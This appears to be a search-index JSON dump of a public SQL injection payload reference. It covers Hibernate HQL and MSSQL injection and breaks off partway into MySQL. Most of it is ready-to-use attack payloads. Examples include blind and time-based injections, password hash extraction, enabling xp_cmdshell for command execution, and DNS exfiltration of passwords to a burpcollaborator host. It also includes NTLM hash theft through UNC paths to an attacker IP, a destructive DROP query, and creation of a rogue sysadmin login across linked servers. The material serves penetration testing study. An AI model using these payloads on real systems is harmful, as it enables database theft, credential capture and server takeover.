org.apache.batik.util.XMLConstants.XML_CHAR_APOS [ Apache Batik ] com.ibm.icu.impl.PatternTokenizer.SINGLE_QUOTE [ ICU4J ] jodd.util.StringPool.SINGLE_QUOTE [ Jodd ] ch.qos.logback.core.CoreConstants.SINGLE_QUOTE_CHAR [ Logback ] cz.vutbr.web.csskit.OutputUtil.STRING_OPENING [ jStyleParser ] com.sun.java.help.impl.DocPConst.QUOTE [ JavaHelp ] org.eclipse.help.internal.webapp.utils.JSonHelper.QUOTE [ EclipseHelp ] dummy' and hqli.persistent.Constants.C_QUOTE_1*X('<>CHAR(41) and (select count(1) from sysibm.sysdummy1)>0 --')=1 and '1'='1 Methods by DBMS References HQL for pentesters - February 12, 2014 - Philippe Arteau How to put a comment into HQL (Hibernate Query Language)? - Thomas Bratt HQL : Hyperinsane Query Language - 04/06/2015 - Renaud Dubourguais ORM2Pwn: Exploiting injections in Hibernate ORM - Nov 26, 2015 - Mikhail Egorov New Methods for Exploiting ORM Injections in Java Applications - HITBSecConf2016 - Mikhail Egorov - Sergey Soldatov HQL Injection Exploitation in MySQL - July 18, 2019 - Olga Barinova","title":"Hibernate Query Language Injection"},{"location":"SQL%20Injection/HQL%20Injection/#hibernate-query-language-injection","text":"Hibernate ORM (Hibernate in short) is an object-relational mapping tool for the Java programming language. It provides a framework for mapping an object-oriented domain model to a relational database. - Wikipedia","title":"Hibernate Query Language Injection"},{"location":"SQL%20Injection/HQL%20Injection/#summary","text":"HQL Comments HQL List Columns HQL Error Based Single Quote Escaping $-quoted strings DBMS Magic functions Unicode Java constants Methods by DBMS References","title":"Summary"},{"location":"SQL%20Injection/HQL%20Injection/#hql-comments","text":"HQL does not support comments","title":"HQL Comments"},{"location":"SQL%20Injection/HQL%20Injection/#hql-list-columns","text":"from BlogPosts where title like '%' and DOESNT_EXIST=1 and ''='%' -- and published = true Using an unexisting column will an exception leaking several columns names. org.hibernate.exception.SQLGrammarException: Column \"DOESNT_EXIST\" not found; SQL statement: select blogposts0_.id as id21_, blogposts0_.author as author21_, blogposts0_.promoCode as promo3_21_, blogposts0_.title as title21_, blogposts0_.published as published21_ from BlogPosts blogposts0_ where blogposts0_.title like '%' or DOESNT_EXIST='%' and blogposts0_.published=1 [42122-159]","title":"HQL List Columns"},{"location":"SQL%20Injection/HQL%20Injection/#hql-error-based","text":"from BlogPosts where title like '%11' and (select password from User where username='admin')=1 or ''='%' and published = true Error based on value casting. Data conversion error converting \"d41d8cd98f00b204e9800998ecf8427e\"; SQL statement: select blogposts0_.id as id18_, blogposts0_.author as author18_, blogposts0_.promotionCode as promotio3_18_, blogposts0_.title as title18_, blogposts0_.visible as visible18_ from BlogPosts blogposts0_ where blogposts0_.title like '%11' and (select user1_.password from User user1_ where user1_.username = 'admin')=1 or ''='%' and blogposts0_.published=1 :warning: HQL does not support UNION queries","title":"HQL Error Based"},{"location":"SQL%20Injection/HQL%20Injection/#single-quote-escaping","text":"Method works for MySQL DBMS which escapes SINGLE QUOTES in strings with SLASH \\' . In HQL SINGLE QUOTES is escaped in strings by doubling '' . 'abc\\''or 1=(select 1)--' In HQL it is a string, in MySQL it is a string and additional SQL expression.","title":"Single Quote Escaping"},{"location":"SQL%20Injection/HQL%20Injection/#-quoted-strings","text":"Method works for DBMS which allow DOLLAR-QUOTED strings in SQL expressions: PostgreSQL, H2. Hibernate ORM allows identifiers starting with $$ . $$='$$=concat(chr(61),chr(39)) and 1=1--'","title":"$-quoted strings"},{"location":"SQL%20Injection/HQL%20Injection/#dbms-magic-functions","text":"Method works for DBMS which have MAGIC FUNCTIONS which evaluate SQL expression in string parameter: PostgreSQL, Oracle. Hibernate allows to specify any function name in HQL expression. PostgreSQL has built-in function query_to_xml('Arbitrary SQL') . array_upper(xpath('row',query_to_xml('select 1 where 1337>1', true, false,'')),1) Oracle has built-in function DBMS_XMLGEN.getxml('SQL') NVL(TO_CHAR(DBMS_XMLGEN.getxml('select 1 where 1337>1')),'1')!='1'","title":"DBMS Magic functions"},{"location":"SQL%20Injection/HQL%20Injection/#unicode","text":"Method works for DBMS which allow UNICODE delimiters (Ex. U+00A0) between SQL tokens: Microsoft SQL Server, H2. In Microsoft SQL SERVER SELECT LEN([U+00A0](select[U+00A0](1)) works the same as SELECT LEN((SELECT(1))) ; HQL allows UNICODE symbols in identifiers (function or parameter names). SELECT p FROM hqli.persistent.Post p where p.name='dummy' or 1<LEN( (select top 1 name from users)) or '1'='11'","title":"Unicode"},{"location":"SQL%20Injection/HQL%20Injection/#java-constants","text":"Method works for most DBMS (does not work for MySQL). Hibernate resolves Java public static fields (Java constants) in HQL queries: Class with Java constant must be in classpath Ex. java.lang.Character.SIZE is resolved to 16 String or char constants are additionally surrounded by single quotes To use JAVA CONSTANTS method we need special char or string fields declared in classes or interfaces on classpath. public class Constants { public static final String S_QUOTE = \"'\"; public static final String HQL_PART = \"select * from Post where name = '\"; public static final char C_QUOTE_1 = '\\''; public static final char C_QUOTE_2 = '\\047'; public static final char C_QUOTE_3 = 39; public static final char C_QUOTE_4 = 0x27; public static final char C_QUOTE_5 = 047; } Some usable constants in well-known Java libraries: org.apache.batik.util.XMLConstants.XML_CHAR_APOS [ Apache Batik ] com.ibm.icu.impl.PatternTokenizer.SINGLE_QUOTE [ ICU4J ] jodd.util.StringPool.SINGLE_QUOTE [ Jodd ] ch.qos.logback.core.CoreConstants.SINGLE_QUOTE_CHAR [ Logback ] cz.vutbr.web.csskit.OutputUtil.STRING_OPENING [ jStyleParser ] com.sun.java.help.impl.DocPConst.QUOTE [ JavaHelp ] org.eclipse.help.internal.webapp.utils.JSonHelper.QUOTE [ EclipseHelp ] dummy' and hqli.persistent.Constants.C_QUOTE_1*X('<>CHAR(41) and (select count(1) from sysibm.sysdummy1)>0 --')=1 and '1'='1","title":"Java constants"},{"location":"SQL%20Injection/HQL%20Injection/#methods-by-dbms","text":"","title":"Methods by DBMS"},{"location":"SQL%20Injection/HQL%20Injection/#references","text":"HQL for pentesters - February 12, 2014 - Philippe Arteau How to put a comment into HQL (Hibernate Query Language)? - Thomas Bratt HQL : Hyperinsane Query Language - 04/06/2015 - Renaud Dubourguais ORM2Pwn: Exploiting injections in Hibernate ORM - Nov 26, 2015 - Mikhail Egorov New Methods for Exploiting ORM Injections in Java Applications - HITBSecConf2016 - Mikhail Egorov - Sergey Soldatov HQL Injection Exploitation in MySQL - July 18, 2019 - Olga Barinova","title":"References"},{"location":"SQL%20Injection/MSSQL%20Injection/","text":"MSSQL Injection Summary MSSQL Comments MSSQL User MSSQL Version MSSQL Hostname MSSQL Database name MSSQL List databases MSSQL List columns MSSQL List tables MSSQL Extract user/password MSSQL Union Based MSSQL Error Based MSSQL Blind Based MSSQL Time Based MSSQL Stacked query MSSQL Read file MSSQL Command execution MSSQL Out of band MSSQL DNS exfiltration MSSQL UNC path MSSQL Make user DBA MSSQL Trusted Links MSSQL List permissions MSSQL Comments -- comment goes here /* comment goes here */ MSSQL User SELECT CURRENT_USER SELECT user_name(); SELECT system_user; SELECT user; MSSQL version SELECT @@version MSSQL Hostname SELECT HOST_NAME() SELECT @@hostname; MSSQL Database name SELECT DB_NAME() MSSQL List databases SELECT name FROM master..sysdatabases; SELECT DB_NAME(N); \u2014 for N = 0, 1, 2, \u2026 SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; -- Change delimeter value such as ', ' to anything else you want => master, tempdb, model, msdb (Only works in MSSQL 2017+) MSSQL List columns SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = \u2018mytable\u2019); \u2014 for the current DB only SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=\u2019sometable\u2019; \u2014 list colum names and types for master..sometable SELECT table_catalog, column_name FROM information_schema.columns MSSQL List tables SELECT name FROM master..sysobjects WHERE xtype = \u2018U\u2019; \u2014 use xtype = \u2018V\u2019 for views SELECT name FROM someotherdb..sysobjects WHERE xtype = \u2018U\u2019; SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=\u2019sometable\u2019; \u2014 list colum names and types for master..sometable SELECT table_catalog, table_name FROM information_schema.columns SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U'; -- Change delimeter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options (Only works in MSSQL 2017+) MSSQL Extract user/password MSSQL 2000: SELECT name, password FROM master..sysxlogins SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.) MSSQL 2005 SELECT name, password_hash FROM master.sys.sql_logins SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins MSSQL Union Based -- extract databases names $ SELECT name FROM master..sysdatabases [*] Injection [*] msdb [*] tempdb -- extract tables from Injection database $ SELECT name FROM Injection..sysobjects WHERE xtype = 'U' [*] Profiles [*] Roles [*] Users -- extract columns for the table Users $ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users') [*] UserId [*] UserName -- Finally extract the data $ SELECT UserId, UserName from Users MSSQL Error based For integer inputs : convert(int,@@version) For integer inputs : cast((SELECT @@version) as int) For string inputs : ' + convert(int,@@version) + ' For string inputs : ' + cast((SELECT @@version) as int) + ' MSSQL Blind based AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- - AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97 AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90 SELECT @@version WHERE @@version LIKE '%12.0.2000.8%' WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table) SELECT message FROM data WHERE row = 1 and message like 't%' MSSQL Time based ProductID=1;waitfor delay '0:0:10'-- ProductID=1);waitfor delay '0:0:10'-- ProductID=1';waitfor delay '0:0:10'-- ProductID=1');waitfor delay '0:0:10'-- ProductID=1));waitfor delay '0:0:10'-- IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]' comment: -- MSSQL Stacked Query Use a semi-colon \";\" to add another query ProductID=1; DROP members-- MSSQL Read file Permissions : The BULK option requires the ADMINISTER BULK OPERATIONS or the ADMINISTER DATABASE BULK OPERATIONS permission. -1 union select null,(select x from OpenRowset(BULK 'C:\\Windows\\win.ini',SINGLE_CLOB) R(x)),null,null MSSQL Command execution EXEC xp_cmdshell \"net user\"; EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'; EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1'; If you need to reactivate xp_cmdshell (disabled by default in SQL Server 2005) EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; To interact with the MSSQL instance. sqsh -S 192.168.1.X -U sa -P superPassword python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758 Execute Python script Executed by a different user than the one using xp_cmdshell to execute commands #Print the user being used (and execute commands) EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"getpass\").getuser())' EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"os\").system(\"whoami\"))' #Open and read a file EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open(\"C:\\\\inetpub\\\\wwwroot\\\\web.config\", \"r\").read())' #Multiline EXECUTE sp_execute_external_script @language = N'Python', @script = N' import sys print(sys.version) ' GO MSSQL Out of band MSSQL DNS exfiltration Technique from https://twitter.com/ptswarm/status/1313476695295512578/photo/1 # Permissions: Requires VIEW SERVER STATE permission on the server. 1 and exists(select * from fn_xe_file_target_read_file('C:\\*.xel','\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\1.xem',null,null)) # Permissions: Requires the CONTROL SERVER permission. 1 (select 1 where exists(select * from fn_get_audit_file('\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\',default,default))) 1 and exists(select * from fn_trace_gettable('\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\1.trc',default)) MSSQL UNC Path MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the xp_dirtree function to list the files in our SMB share and grab the NTLMv2 hash. 1'; use master; exec xp_dirtree '\\\\10.10.15.XX\\SHARE';-- xp_dirtree '\\\\attackerip\\file' xp_fileexist '\\\\attackerip\\file' BACKUP LOG [TESTING] TO DISK = '\\\\attackerip\\file' BACKUP DATABASE [TESTING] TO DISK = '\\\\attackeri\\file' RESTORE LOG [TESTING] FROM DISK = '\\\\attackerip\\file' RESTORE DATABASE [TESTING] FROM DISK = '\\\\attackerip\\file' RESTORE HEADERONLY FROM DISK = '\\\\attackerip\\file' RESTORE FILELISTONLY FROM DISK = '\\\\attackerip\\file' RESTORE LABELONLY FROM DISK = '\\\\attackerip\\file' RESTORE REWINDONLY FROM DISK = '\\\\attackerip\\file' RESTORE VERIFYONLY FROM DISK = '\\\\attackerip\\file' MSSQL Make user DBA (DB admin) EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin; MSSQL Trusted Links The links between databases work even across forest trusts. msf> use exploit/windows/mssql/mssql_linkcrawler [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter sessio Manual exploitation -- find link select * from master..sysservers -- execute query through the link select * from openquery(\"dcorp-sql1\", 'select * from master..sysservers') select version from openquery(\"linkedserver\", 'select @@version as version'); -- chain multiple openquery select version from openquery(\"link1\",'select version from openquery(\"link2\",\"select @@version as version\")') -- execute shell commands EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer select 1 from openquery(\"linkedserver\",'select 1;exec master..xp_cmdshell \"dir c:\"') -- create user and give admin privileges EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\" EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\" List permissions Listing effective permissions of current user on the server. SELECT * FROM fn_my_permissions(NULL, 'SERVER'); Listing effective permissions of current user on the database. SELECT * FROM fn_my_permissions (NULL, 'DATABASE'); Listing effective permissions of current user on a view. SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name; Check if current user is a member of the specified server role. -- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin SELECT is_srvrolemember('sysadmin'); References Pentest Monkey - mssql-sql-injection-cheat-sheet Error Based - SQL Injection MSSQL Trusted Links - HackTricks.xyz SQL Server \u2013 Link\u2026 Link\u2026 Link\u2026 and Shell: How to Hack Database Links in SQL Server! - Antti Rantasaari - June 6th, 2013 DAFT: Database Audit Framework & Toolkit - NetSPI SQL Server UNC Path Injection Cheatsheet - nullbind Full MSSQL Injection PWNage - ZeQ3uL && JabAv0C - 28 January 2009 Microsoft - sys.fn_my_permissions (Transact-SQL) Microsoft - IS_SRVROLEMEMBER (Transact-SQL)","title":"MSSQL Injection"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-injection","text":"","title":"MSSQL Injection"},{"location":"SQL%20Injection/MSSQL%20Injection/#summary","text":"MSSQL Comments MSSQL User MSSQL Version MSSQL Hostname MSSQL Database name MSSQL List databases MSSQL List columns MSSQL List tables MSSQL Extract user/password MSSQL Union Based MSSQL Error Based MSSQL Blind Based MSSQL Time Based MSSQL Stacked query MSSQL Read file MSSQL Command execution MSSQL Out of band MSSQL DNS exfiltration MSSQL UNC path MSSQL Make user DBA MSSQL Trusted Links MSSQL List permissions","title":"Summary"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-comments","text":"-- comment goes here /* comment goes here */","title":"MSSQL Comments"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-user","text":"SELECT CURRENT_USER SELECT user_name(); SELECT system_user; SELECT user;","title":"MSSQL User"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-version","text":"SELECT @@version","title":"MSSQL version"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-hostname","text":"SELECT HOST_NAME() SELECT @@hostname;","title":"MSSQL Hostname"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-database-name","text":"SELECT DB_NAME()","title":"MSSQL Database name"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-list-databases","text":"SELECT name FROM master..sysdatabases; SELECT DB_NAME(N); \u2014 for N = 0, 1, 2, \u2026 SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; -- Change delimeter value such as ', ' to anything else you want => master, tempdb, model, msdb (Only works in MSSQL 2017+)","title":"MSSQL List databases"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-list-columns","text":"SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = \u2018mytable\u2019); \u2014 for the current DB only SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=\u2019sometable\u2019; \u2014 list colum names and types for master..sometable SELECT table_catalog, column_name FROM information_schema.columns","title":"MSSQL List columns"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-list-tables","text":"SELECT name FROM master..sysobjects WHERE xtype = \u2018U\u2019; \u2014 use xtype = \u2018V\u2019 for views SELECT name FROM someotherdb..sysobjects WHERE xtype = \u2018U\u2019; SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=\u2019sometable\u2019; \u2014 list colum names and types for master..sometable SELECT table_catalog, table_name FROM information_schema.columns SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U'; -- Change delimeter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options (Only works in MSSQL 2017+)","title":"MSSQL List tables"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-extract-userpassword","text":"MSSQL 2000: SELECT name, password FROM master..sysxlogins SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.) MSSQL 2005 SELECT name, password_hash FROM master.sys.sql_logins SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins","title":"MSSQL Extract user/password"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-union-based","text":"-- extract databases names $ SELECT name FROM master..sysdatabases [*] Injection [*] msdb [*] tempdb -- extract tables from Injection database $ SELECT name FROM Injection..sysobjects WHERE xtype = 'U' [*] Profiles [*] Roles [*] Users -- extract columns for the table Users $ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users') [*] UserId [*] UserName -- Finally extract the data $ SELECT UserId, UserName from Users","title":"MSSQL Union Based"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-error-based","text":"For integer inputs : convert(int,@@version) For integer inputs : cast((SELECT @@version) as int) For string inputs : ' + convert(int,@@version) + ' For string inputs : ' + cast((SELECT @@version) as int) + '","title":"MSSQL Error based"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-blind-based","text":"AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- - AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97 AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90 SELECT @@version WHERE @@version LIKE '%12.0.2000.8%' WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table) SELECT message FROM data WHERE row = 1 and message like 't%'","title":"MSSQL Blind based"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-time-based","text":"ProductID=1;waitfor delay '0:0:10'-- ProductID=1);waitfor delay '0:0:10'-- ProductID=1';waitfor delay '0:0:10'-- ProductID=1');waitfor delay '0:0:10'-- ProductID=1));waitfor delay '0:0:10'-- IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]' comment: --","title":"MSSQL Time based"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-stacked-query","text":"Use a semi-colon \";\" to add another query ProductID=1; DROP members--","title":"MSSQL Stacked Query"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-read-file","text":"Permissions : The BULK option requires the ADMINISTER BULK OPERATIONS or the ADMINISTER DATABASE BULK OPERATIONS permission. -1 union select null,(select x from OpenRowset(BULK 'C:\\Windows\\win.ini',SINGLE_CLOB) R(x)),null,null","title":"MSSQL Read file"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-command-execution","text":"EXEC xp_cmdshell \"net user\"; EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'; EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1'; If you need to reactivate xp_cmdshell (disabled by default in SQL Server 2005) EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; To interact with the MSSQL instance. sqsh -S 192.168.1.X -U sa -P superPassword python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758 Execute Python script Executed by a different user than the one using xp_cmdshell to execute commands #Print the user being used (and execute commands) EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"getpass\").getuser())' EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"os\").system(\"whoami\"))' #Open and read a file EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open(\"C:\\\\inetpub\\\\wwwroot\\\\web.config\", \"r\").read())' #Multiline EXECUTE sp_execute_external_script @language = N'Python', @script = N' import sys print(sys.version) ' GO","title":"MSSQL Command execution"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-out-of-band","text":"","title":"MSSQL Out of band"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-dns-exfiltration","text":"Technique from https://twitter.com/ptswarm/status/1313476695295512578/photo/1 # Permissions: Requires VIEW SERVER STATE permission on the server. 1 and exists(select * from fn_xe_file_target_read_file('C:\\*.xel','\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\1.xem',null,null)) # Permissions: Requires the CONTROL SERVER permission. 1 (select 1 where exists(select * from fn_get_audit_file('\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\',default,default))) 1 and exists(select * from fn_trace_gettable('\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\1.trc',default))","title":"MSSQL DNS exfiltration"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-unc-path","text":"MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the xp_dirtree function to list the files in our SMB share and grab the NTLMv2 hash. 1'; use master; exec xp_dirtree '\\\\10.10.15.XX\\SHARE';-- xp_dirtree '\\\\attackerip\\file' xp_fileexist '\\\\attackerip\\file' BACKUP LOG [TESTING] TO DISK = '\\\\attackerip\\file' BACKUP DATABASE [TESTING] TO DISK = '\\\\attackeri\\file' RESTORE LOG [TESTING] FROM DISK = '\\\\attackerip\\file' RESTORE DATABASE [TESTING] FROM DISK = '\\\\attackerip\\file' RESTORE HEADERONLY FROM DISK = '\\\\attackerip\\file' RESTORE FILELISTONLY FROM DISK = '\\\\attackerip\\file' RESTORE LABELONLY FROM DISK = '\\\\attackerip\\file' RESTORE REWINDONLY FROM DISK = '\\\\attackerip\\file' RESTORE VERIFYONLY FROM DISK = '\\\\attackerip\\file'","title":"MSSQL UNC Path"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-make-user-dba-db-admin","text":"EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;","title":"MSSQL Make user DBA (DB admin)"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-trusted-links","text":"The links between databases work even across forest trusts. msf> use exploit/windows/mssql/mssql_linkcrawler [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter sessio Manual exploitation -- find link select * from master..sysservers -- execute query through the link select * from openquery(\"dcorp-sql1\", 'select * from master..sysservers') select version from openquery(\"linkedserver\", 'select @@version as version'); -- chain multiple openquery select version from openquery(\"link1\",'select version from openquery(\"link2\",\"select @@version as version\")') -- execute shell commands EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer select 1 from openquery(\"linkedserver\",'select 1;exec master..xp_cmdshell \"dir c:\"') -- create user and give admin privileges EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\" EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\"","title":"MSSQL Trusted Links"},{"location":"SQL%20Injection/MSSQL%20Injection/#list-permissions","text":"Listing effective permissions of current user on the server. SELECT * FROM fn_my_permissions(NULL, 'SERVER'); Listing effective permissions of current user on the database. SELECT * FROM fn_my_permissions (NULL, 'DATABASE'); Listing effective permissions of current user on a view. SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name; Check if current user is a member of the specified server role. -- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin SELECT is_srvrolemember('sysadmin');","title":"List permissions"},{"location":"SQL%20Injection/MSSQL%20Injection/#references","text":"Pentest Monkey - mssql-sql-injection-cheat-sheet Error Based - SQL Injection MSSQL Trusted Links - HackTricks.xyz SQL Server \u2013 Link\u2026 Link\u2026 Link\u2026 and Shell: How to Hack Database Links in SQL Server! - Antti Rantasaari - June 6th, 2013 DAFT: Database Audit Framework & Toolkit - NetSPI SQL Server UNC Path Injection Cheatsheet - nullbind Full MSSQL Injection PWNage - ZeQ3uL && JabAv0C - 28 January 2009 Microsoft - sys.fn_my_permissions (Transact-SQL) Microsoft - IS_SRVROLEMEMBER (Transact-SQL)","title":"References"},{"location":"SQL%20Injection/MySQL%20Injection/","text":"MYSQL Injection Summary MYSQL Comment MYSQL Union Based Detect columns number Extract database with information_schema Extract columns name without information_schema Extract data without columns name MYSQL Error Based MYSQL Error Based - Basic MYSQL Error Based - UpdateXML function MYSQL Error Based - Extractvalue function MYSQL Blind MYSQL Blind with substring equivalent MYSQL Blind using a conditional statement MYSQL Blind with MAKE_SET MYSQL Blind with LIKE MYSQL Time Based Using SLEEP in a subselect Using conditional statements MYSQL DIOS - Dump in One Shot MYSQL Current queries MYSQL Read content of a file MYSQL Write a shell Into outfile method Into dumpfile method MYSQL UDF command execution MYSQL Truncation MYSQL Fast Exploitation MYSQL Out of band DNS exfiltration UNC Path - NTLM hash stealing References MYSQL comment # MYSQL Comment -- comment [Note the space after the double dash] /* MYSQL Comment */ /*! MYSQL Special SQL */ /*!32302 10*/ Comment for MYSQL version 3.23.02 MYSQL Union Based Detect columns number First you need to know the number of columns Using order by or group by Keep incrementing the number until you get a False response. Even though GROUP BY and ORDER BY have different funcionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query. 1' ORDER BY 1--+ #True 1' ORDER BY 2--+ #True 1' ORDER BY 3--+ #True 1' ORDER BY 4--+ #False - Query is only using 3 columns #-1' UNION SELECT 1,2,3--+ True or 1' GROUP BY 1--+ #True 1' GROUP BY 2--+ #True 1' GROUP BY 3--+ #True 1' GROUP BY 4--+ #False - Query is only using 3 columns #-1' UNION SELECT 1,2,3--+ True Using order by or group by Error Based Similar to the previous method, we can check the number of columns with 1 request if error showing is enabled. 1' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # Unknown column '4' in 'order clause' # This error means query uses 3 column #-1' UNION SELECT 1,2,3--+ True or 1' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # Unknown column '4' in 'group statement' # This error means query uses 3 column #-1' UNION SELECT 1,2,3--+ True Using UNION SELECT Error Based This method works if error showing is enabled 1' UNION SELECT @--+ #The used SELECT statements have a different number of columns 1' UNION SELECT @,@--+ #The used SELECT statements have a different number of columns 1' UNION SELECT @,@,@--+ #No error means query uses 3 column #-1' UNION SELECT 1,2,3--+ True Using LIMIT INTO Error Based This method works if error showing is enabled. It is useful for finding the number of columns when the injection point is after a LIMIT clause. 1' LIMIT 1,1 INTO @--+ #The used SELECT statements have a different number of columns 1' LIMIT 1,1 INTO @,@--+ #The used SELECT 